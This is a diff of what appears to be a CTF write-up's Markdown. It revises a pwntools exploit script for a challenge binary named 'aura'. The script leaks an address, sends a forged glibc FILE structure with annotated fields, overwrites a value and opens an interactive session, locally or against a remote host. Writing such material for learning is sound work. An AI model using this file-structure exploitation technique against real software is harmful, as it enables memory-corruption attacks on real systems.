@@ -73,36 +73,57 @@ from pwn import *
 import argparse
 
 def connect(host=None, port=None):
-    return remote(host, port) if host and port else process('./aura')
+   if host and port:
+      log.info(f"Connecting remotely to {host}:{port}")
+      return remote(host, port)
+   else:
+      log.info("Running locally")
+      return process('./aura')
 
 def leak_aura(p):
-    p.recvuntil(b'my aura: ')
-    return int(p.recvline().strip(), 16)
+   p.recvuntil(b'my aura: ')
+   aura = int(p.recvline().strip(), 16)
+   log.success(f"Leaked aura address: {hex(aura)}")
+   return aura
 
-def forge_payload(aura_addr):
-    payload  = p64(0) * 7
-    payload += p64(aura_addr) + p64(aura_addr + 0x10)
-    payload = payload.ljust(0x88, b' ')
-    payload += p64(aura_addr)
-    return payload
+def forge_minimal_payload(aura_addr):
+   payload  = p64(0)              # _flags
+   payload += p64(0)              # _IO_read_ptr
+   payload += p64(0)              # _IO_read_end
+   payload += p64(0)              # _IO_read_base
+   payload += p64(0)              # _IO_write_base
+   payload += p64(0)              # _IO_write_ptr
+   payload += p64(0)              # _IO_write_end
+   payload += p64(aura_addr)       # _IO_buf_base
+   payload += p64(aura_addr + 0x10) # _IO_buf_end
+   payload = payload.ljust(0x88, b'\x00')
+   payload += p64(aura_addr)       # chain pointer at offset 0x88
+   return payload
 
 def exploit(p):
-    aura = leak_aura(p)
-    p.recvuntil(b'ur aura? ')
-    p.send(forge_payload(aura))
-    p.sendline(b'A'*8)
-    p.interactive()
+   aura = leak_aura(p)
+   p.recvuntil(b'ur aura? ')
+   payload = forge_minimal_payload(aura)
+   log.info("Sending forged FILE structure")
+   p.send(payload)
+
+   log.info("Overwriting aura value")
+   p.sendline(b'A'*8)  # Send 8 non-null bytes to overwrite aura
+
+   p.interactive()
 
 def main():
-    parser = argparse.ArgumentParser()
-    parser.add_argument('--host', type=str)
-    parser.add_argument('--port', type=int)
-    args = parser.parse_args()
-    p = connect(args.host, args.port)
-    exploit(p)
+   parser = argparse.ArgumentParser(description="Exploit aura challenge (local/remote)")
+   parser.add_argument('--host', type=str, help='Remote host')
+   parser.add_argument('--port', type=int, help='Remote port')
+   args = parser.parse_args()
+
+   p = connect(args.host, args.port)
+   exploit(p)
 
 if __name__ == '__main__':
-    main()
+   context.binary = './aura'
+   main()
 ```
 
 ## Result 🏆
